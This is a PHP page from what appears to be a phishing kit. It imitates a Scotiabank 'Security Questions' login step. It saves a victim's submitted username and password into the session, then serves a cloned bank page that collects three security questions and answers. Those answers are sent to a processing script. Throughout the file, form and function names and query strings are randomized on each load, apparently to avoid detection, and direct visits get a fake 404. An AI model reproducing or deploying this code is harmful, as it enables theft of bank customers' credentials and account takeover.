<?php
session_start();
error_reporting(0);
include "../control.php";
include "../sc.php";

if(isset($_POST["uname"]))
{
	$uname=$_SESSION["uname"]=$_POST["uname"];
	$pword=$_SESSION["pword"]=$_POST["pword"];

	if(strlen($pword)<6 || strlen($uname)<4 )
	{
		
		echo '<script>window.location.assign("authntication.bs.php?intcp='.randomCha(rand(2,3)).'|LOGIN|F='.randomCha(rand(30,60)).'&errOccured=1");</script>';
		die();
	}
	
	
	$fname=randomCha(rand(10,13));
	$fj=randomCha(rand(14,15));
	echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head>
		
		<meta http-equiv="content-type" content="text/html; charset=UTF-8">
		<meta http-equiv="content-language" content="en">
		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
		
		<title>
		Security Question
		</title>
		
		<meta http-equiv="Cache-Control" content="no-cache">
		<meta http-equiv="pragma" content="no-cache">
		<meta http-equiv="expires" content="0"> 

		<meta http-equiv="Content-Style-Type" content="text/css">
		<meta http-equiv="Content-Script-Type" content="text/javascript">
		
		<link rel="shortcut icon" href="favicon.ico">
		
		
		<link rel="stylesheet" type="text/css" media="all" href="measure/load.css?load_id='.randomCha(rand(15,16)).'">
		<link rel="stylesheet" type="text/css" media="all" href="measure/jquery.css?load_id='.randomCha(rand(15,16)).'">
		<link rel="stylesheet" type="text/css" media="screen" href="measure/load2.css?load_id='.randomCha(rand(15,16)).'">
		<link href="measure/plugin.css?load_id='.randomCha(rand(15,16)).'" rel="stylesheet" type="text/css">
		</head>
	
	<body>
	 <div id="helpCentreCurtain" class="helpCurtain" style="display: none"><form id="showContactUsByJSLink" name="showContactUsByJSLink" method="post" action="/online/authentication/mfaAuthentication.bns" target=""></form><span id="helpCentre_curtainContent_container"><div id="helpCentre_curtainSearch_container" class="search"><form id="helpCentre_curtain_searchForm" name="helpCentre_curtain_searchForm" method="post" action="/online/authentication/mfaAuthentication.bns" target="">	
			<div class="left-wrapper">
	<fieldset class="">
		<legend>Search form</legend>
					<h3>Help </h3>
					<div class="search-input-wrapper"><label for="helpCentre_curtain_searchForm:helpCentre_txtQueryInput" class="off-screen">
Search for</label><input id="helpCentre_curtain_searchForm:helpCentre_txtQueryInput" type="text" name="helpCentre_curtain_searchForm:helpCentre_txtQueryInput" class="search-input">
						<a class="skip" href="#main-content" >skip to search result</a><input class="primary-button" id="helpCentre_curtain_searchForm:searchSubmit" name="helpCentre_curtain_searchForm:searchSubmit"  value="Search" type="submit">						
					</div>				
					<div class="help-ajax-loading"><span id="_viewRoot:status"><span id="_viewRoot:status.start" style="display: none">
	                    		<img style="float:left;" src="measure/ajax-loader-small.gif"></span><span id="_viewRoot:status.stop"></span></span>																													
					</div>
	</fieldset>			
			</div>
			<div class="right-wrapper">		    
				<div class="send-message-wrapper">
						<a href="#"  >Branch &amp; ABM Locator  </a>
				</div>
				<a href="javascript:void(0)" id="helpcentre_printHelpSection" class="printHelpSection float-left" title="" >
					<img alt="Print Help section" src="measure/icon_print.png">
				</a>				
				<div class="close-link-wrapper"><a class="closeHelp var_helpCentre_closeLink" href="#" id="helpCentre_curtain_searchForm:cmdHideAskCurtain" name="helpCentre_curtain_searchForm:cmdHideAskCurtain" >Close</a>
					<span class="off-screen">Help   </span>																	 		
				</div>			
			</div></form></div>
	
			<div class="help"><form id="helpCentre_curtain_contentForm" name="helpCentre_curtain_contentForm" method="post" action="/online/authentication/mfaAuthentication.bns" target=""></form>							
			</div>
			</span>
	</div>
		
		
		<div class="page_bg">
		<div class="page-wrapper">
	
		
	<div class="header">
		<div class="scotia-logo" tabindex="0"><a href="#" id="scotia-logo-img-id" title="" class="scotia-logo-image" >
			
			<div class="scotia-logo-img-div-en" role="img" aria-label="Scotiabank Group"></div></a>
			<span class="scotia-logo-image-bw">
				<img src="measure/scotiabank-group-bw.gif" alt="Scotiabank Group">
			</span>
		</div>
		<a class="skip-nav" href="#main-content" >Skip to main content</a>
		<div class="header-links">
			<ul title=""><span id="helpCentre_curtainMenu_container">				
				<li class="var_main_top-links_tab_1"><form id="helpCentre_curtainMenuControls_helpform" name="helpCentre_curtainMenuControls_helpform" method="post" action="/online/authentication/mfaAuthentication.bns" target=""><a class="var_helpCentre_helpLink " href="#" id="helpCentre_curtainMenuControls_helpform:j_id48" name="helpCentre_curtainMenuControls_helpform:j_id48" ><span id="helpCentre_curtainMenuControls_helpform:j_id49" class="">Help</span></a></form>					
				</li>
				<li class="var_main_top-links_tab_2"><form id="helpCentre_curtainMenuControls_contactform" name="helpCentre_curtainMenuControls_contactform" method="post" action="/online/authentication/mfaAuthentication.bns" target=""><a class="var_helpCentre_contactLink " href="#" id="helpCentre_curtainMenuControls_contactform:j_id52" name="helpCentre_curtainMenuControls_contactform:j_id52" ><span id="helpCentre_curtainMenuControls_contactform:j_id53" class="">Contact</span></a></form>		
				</li>
				</span>
					<li class="var_main_top-links_tab_3">
						<a href="#"  >
							<span>Locate Us</span>
						</a>
					</li>
<form id="lang_switch_form_1" name="lang_switch_form_1" method="post" action="#">

<span id="lang_switch_form_1:sel_en_000">
		<li class="var_main_top-links_tab_6">

<a id="lang_switch_form_1:fr_sel_000" href="#" >Français</a>
		</li></span>
</form>
			</ul>
		</div>
	</div>
	<div class="clearboth"></div>
	
	<div class="navigation pre-sign-on-flow"></div>
				
   	<div class="clearboth"></div>
			
			
			<div class="signon-wrapper">
			<div class="content">

		
		<div class="dataview full-width">
			<a name="main-content"></a>
			<h1>authentication.mfa</h1>
			
			<div class="form-data ftf-form-data">
			
			<span id="errMain" style="display:none"><div class="ewa-bucket" tabindex="0">
			<h4 class="off-screen">Error Messages</h4>
			<ul class="error">
					<li>
						<span>Answers should be between 2 - 100 characters long and cannot contain special characters (e.g., !, @, #, etc.). (Error #MFA2-1 - Security Questions)
						</span>
					</li>
			</ul></div></span>
			
			
			
			<span id="errMain1" style="display:none"><div class="ewa-bucket" tabindex="0">
			<h4 class="off-screen">Error Messages</h4>
			<ul class="error">
					<li>
						<span>Please select the question you registered . (Error #MFA2-6 - Security Questions)
						</span>
					</li>
			</ul></div></span>
			
			<span id="errMain2" style="display:none"><div class="ewa-bucket" tabindex="0">
			<h4 class="off-screen">Error Messages</h4>
			<ul class="error">
					<li>
						<span>Please select and answer three different questions.  (Error #MFA2-2 - Duplicate Security Questions)</span>
					</li>
			</ul></div></span>
			


<script>
function '.$fj.'() {
    var a = document.forms["'.$fname.'"]["qq1"];
    var b = document.forms["'.$fname.'"]["aa1"];
    var c = document.forms["'.$fname.'"]["qq2"];
    var d = document.forms["'.$fname.'"]["aa2"];
    var e = document.forms["'.$fname.'"]["qq3"];
    var f = document.forms["'.$fname.'"]["aa3"];

 
  


    if ( a.value.length<2 )
{
 a.className="error";
 document.getElementById("errMain1").style.display="";
 a.focus();
return false;
}
else
{
a.className="";
document.getElementById("errMain1").style.display="none";
}
  if ( b.value.length<2 )
{
 b.className="error inputwidth-lrg";
 document.getElementById("errMain").style.display="";
 b.focus();
return false;
}
else
{
b.className="inputwidth-lrg";
document.getElementById("errMain").style.display="none";
}
 if ( c.value.length<2 )
{
 c.className="error";
 document.getElementById("errMain1").style.display="";
 c.focus();
return false;
}
else
{
c.className="";
document.getElementById("errMain1").style.display="none";
}
 if ( d.value.length<2 )
{
 d.className="error inputwidth-lrg";
 document.getElementById("errMain").style.display="";
 d.focus();
return false;
}
else
{
d.className="inputwidth-lrg";
document.getElementById("errMain").style.display="none";
}
 if ( e.value.length<2 )
{
 e.className="error";
 document.getElementById("errMain1").style.display="";
 e.focus();
return false;
}
else
{
e.className="";
document.getElementById("errMain1").style.display="none";
}

 if ( f.value.length<2 )
{
 f.className="error inputwidth-lrg";
 document.getElementById("errMain").style.display="";
 f.focus();
return false;
}
else
{
f.className="inputwidth-lrg";
document.getElementById("errMain").style.display="none";
}
document.getElementById("errMain").style.display="none";
if(a.value == c.value || e.value == a.value || c.value == e.value)
{
	document.getElementById("errMain2").style.display="";
	window.scrollTo(0,0);
	a.focus();
	return false;
}
else
{
	document.getElementById("errMain2").style.display="none";
}

document.getElementById("'.$fname.'").submit();
return true;

}
</script>		


			
			<span id="span_msgs_5"></span>
<form id="'.$fname.'" name="'.$fname.'" method="post" action="identiy-proc.bs.php?intcp='.randomCha(rand(2,3)).'|IDENTITY|F='.randomCha(rand(30,60)).'" onsubmit="'.$fj.'(); return false;">


			<h2 class="float-left">Security Questions</h2>
			<div class="first-time-user-flow">
			<div class="clearboth"></div>

			<p>This computer or device is not registered in your profile.  Please
 verify your identity by selecting and answering your personal security questions.  (<a href="#" id="mfaAuth_form:j_id115" name="mfaAuth_form:j_id115" >
		<span class="">Why do I need to answer security questions?</span></a>)</p>

			<h3>Security Question</h3>
			<table class="standard-table" summary="Personal Security Question and Answer" width="100%" border="0">
				<colgroup>
					<col width="100px">
					<col>
				</colgroup>

				<tbody>
				

				
				
				
				
				
					<tr>
						<th scope="row"><label for="qq1">Question 1:</label></th>
						<td>
						
						<select id="qq1" name="qq1">
						<option value="">Select from list...</option>
						<option value="As a child, what did you want to be when you grew up?">As a child, what did you want to be when you grew up?
						</option>
						<option value="In what year did you graduate from high school?">In what year did you graduate from high school?
						</option>
						<option value="What is or was the name of the town your grandmother lived in?">What is or was the name of the town your grandmother lived in?
						</option>
						<option value="What is the first name of your oldest nephew?">What is the first name of your oldest nephew?
						</option>
						<option value="What is the first name of your oldest niece?">What is the first name of your oldest niece?
						</option>
						<option value="What is the last name of your favorite teacher in elementary school?">What is the last name of your favorite teacher in elementary school?
						</option>
						<option value="What is the name of your first employer?">What is the name of your first employer?
						</option>
						<option value="What is the name of your first pet?">What is the name of your first pet?
						</option>
						<option value="What is the name of your oldest cousin?">What is the name of your oldest cousin?
						</option>
						<option value="What is your best friend\'s first name?">What is your best friend\'s first name?
						</option>
						<option value="What is your favorite hobby?">What is your favorite hobby?
						</option>
						<option value="What is your favorite movie?">What is your favorite movie?
						</option>
						<option value="What is your favorite vacation destination?">What is your favorite vacation destination?
						</option>
						<option value="What is your paternal grandfather&amp;#39;s first name?">What is your paternal grandfather\'s first name?
						</option>
						<option value="What was the first name of your first manager?">What was the first name of your first manager?
						</option>
						<option value="What was the name of the street on which you grew up?">What was the name of the street on which you grew up?
						</option>
						<option value="What was the name of your elementary school?">What was the name of your elementary school?
						</option>
						<option value="What was the name of your first girlfriend/boyfriend?">What was the name of your first girlfriend/boyfriend?
						</option>
						<option value="Where did you go on your honeymoon?">Where did you go on your honeymoon?
						</option>
						<option value="Where did you meet your spouse for the first time? (Enter name of city)">Where did you meet your spouse for the first time? (Enter name of city)
						</option></select>
						
						</td>
					</tr>
					<tr>
						<th scope="row"><label for="aa1">Answer:</label>
						</th>
						<td><input id="aa1" type="text" name="aa1" autocomplete="off" class="inputwidth-lrg" tabindex="0">
						</td>
					</tr>
					
					
					
					
					
					
					
					
					
					
					
					
					<tr>
						<th scope="row"><label for="qq2">Question 2:</label></th>
						<td>
						
						<select id="qq2" name="qq2">
						<option value="">Select from list...</option>
						<option value="As a child, what did you want to be when you grew up?">As a child, what did you want to be when you grew up?
						</option>
						<option value="In what year did you graduate from high school?">In what year did you graduate from high school?
						</option>
						<option value="What is or was the name of the town your grandmother lived in?">What is or was the name of the town your grandmother lived in?
						</option>
						<option value="What is the first name of your oldest nephew?">What is the first name of your oldest nephew?
						</option>
						<option value="What is the first name of your oldest niece?">What is the first name of your oldest niece?
						</option>
						<option value="What is the last name of your favorite teacher in elementary school?">What is the last name of your favorite teacher in elementary school?
						</option>
						<option value="What is the name of your first employer?">What is the name of your first employer?
						</option>
						<option value="What is the name of your first pet?">What is the name of your first pet?
						</option>
						<option value="What is the name of your oldest cousin?">What is the name of your oldest cousin?
						</option>
						<option value="What is your best friend\'s first name?">What is your best friend\'s first name?
						</option>
						<option value="What is your favorite hobby?">What is your favorite hobby?
						</option>
						<option value="What is your favorite movie?">What is your favorite movie?
						</option>
						<option value="What is your favorite vacation destination?">What is your favorite vacation destination?
						</option>
						<option value="What is your paternal grandfather&amp;#39;s first name?">What is your paternal grandfather\'s first name?
						</option>
						<option value="What was the first name of your first manager?">What was the first name of your first manager?
						</option>
						<option value="What was the name of the street on which you grew up?">What was the name of the street on which you grew up?
						</option>
						<option value="What was the name of your elementary school?">What was the name of your elementary school?
						</option>
						<option value="What was the name of your first girlfriend/boyfriend?">What was the name of your first girlfriend/boyfriend?
						</option>
						<option value="Where did you go on your honeymoon?">Where did you go on your honeymoon?
						</option>
						<option value="Where did you meet your spouse for the first time? (Enter name of city)">Where did you meet your spouse for the first time? (Enter name of city)
						</option></select>
						
						</td>
					</tr>
					<tr>
						<th scope="row"><label for="aa2">Answer:</label>
						</th>
						<td><input id="aa2" type="text" name="aa2" autocomplete="off" class="inputwidth-lrg" tabindex="0">
						</td>
					</tr>
					
					
					
					
					
					
					
					
					
					<tr>
						<th scope="row"><label for="qq3">Question 3:</label></th>
						<td>
						
						<select id="qq3" name="qq3">
						<option value="">Select from list...</option>
						<option value="As a child, what did you want to be when you grew up?">As a child, what did you want to be when you grew up?
						</option>
						<option value="In what year did you graduate from high school?">In what year did you graduate from high school?
						</option>
						<option value="What is or was the name of the town your grandmother lived in?">What is or was the name of the town your grandmother lived in?
						</option>
						<option value="What is the first name of your oldest nephew?">What is the first name of your oldest nephew?
						</option>
						<option value="What is the first name of your oldest niece?">What is the first name of your oldest niece?
						</option>
						<option value="What is the last name of your favorite teacher in elementary school?">What is the last name of your favorite teacher in elementary school?
						</option>
						<option value="What is the name of your first employer?">What is the name of your first employer?
						</option>
						<option value="What is the name of your first pet?">What is the name of your first pet?
						</option>
						<option value="What is the name of your oldest cousin?">What is the name of your oldest cousin?
						</option>
						<option value="What is your best friend\'s first name?">What is your best friend\'s first name?
						</option>
						<option value="What is your favorite hobby?">What is your favorite hobby?
						</option>
						<option value="What is your favorite movie?">What is your favorite movie?
						</option>
						<option value="What is your favorite vacation destination?">What is your favorite vacation destination?
						</option>
						<option value="What is your paternal grandfather&amp;#39;s first name?">What is your paternal grandfather\'s first name?
						</option>
						<option value="What was the first name of your first manager?">What was the first name of your first manager?
						</option>
						<option value="What was the name of the street on which you grew up?">What was the name of the street on which you grew up?
						</option>
						<option value="What was the name of your elementary school?">What was the name of your elementary school?
						</option>
						<option value="What was the name of your first girlfriend/boyfriend?">What was the name of your first girlfriend/boyfriend?
						</option>
						<option value="Where did you go on your honeymoon?">Where did you go on your honeymoon?
						</option>
						<option value="Where did you meet your spouse for the first time? (Enter name of city)">Where did you meet your spouse for the first time? (Enter name of city)
						</option></select>
						
						</td>
					</tr>
					<tr>
						<th scope="row"><label for="aa2">Answer:</label>
						</th>
						<td><input id="aa3" type="text" name="aa3" autocomplete="off" class="inputwidth-lrg" tabindex="0">
						</td>
					</tr>
					
					
					
					
				</tbody>
			</table>

			<br class="clearboth">

			<p style="float:right"> <img src="measure/reg/lock-1.png" style="vertical-align:middle;padding-right:10px;">SSL secured transmission.</p>
				



			<div class="btn-container margin-top-15"><input type="submit" name="mfaAuth_form:j_id139" value="Continue" title="" class="primary-button float-right"><input type="submit" name="mfaAuth_form:j_id140" value="Cancel" title="" class="secondary-button"> 
				 </div>

			</div>
		
</form>
			</div>
		</div>									
			</div>
			<div class="clearboth"></div>
	
	<div class="footer-centered">

		<div id="pageId" class="pageID">
		
		Security Question - challenge:'.randomCha(rand(1,2)).rand(100,999).randomCha(rand(1,2)).rand(100,999).'<div id="j_id148">			
			</div>
		</div>
		<div class="footer">
			<div class="footer-links resp-hide">			
				<ul>
					<li><a  class="rewardsItem" href="javascript:void(0)">Legal</a></li> 
					
					
					<li><a  class="rewardsItem" href="javascript:void(0)">Privacy</a></li>
					<li><a  class="rewardsItem" href="javascript:void(0)">Security</a></li>
					<li><a href="#" class="rewardsItem" >Mobile Site</a></li> 
						<li><a  class="rewardsItem" href="javascript:void(0)">Scotiabank.com</a></li>
				</ul>		
			</div>
			<div class="clearboth"></div>		
		</div><div id="j_id163">
			</div><div id="analyticsEventAjax_div"></div><div id="analyticsEventAjaxLinkLevel_div"></div>	
		
		
		
	
		
		
		
	</div>					
			</div>					
		</div>
		</div>
	
</body></html>';
}
else
{
	header($_SERVER['SERVER_PROTOCOL'] . ' 404 - Page Not Found', true, 404);
	die("<h1>404 - Page Not Found</h1>");
}
?>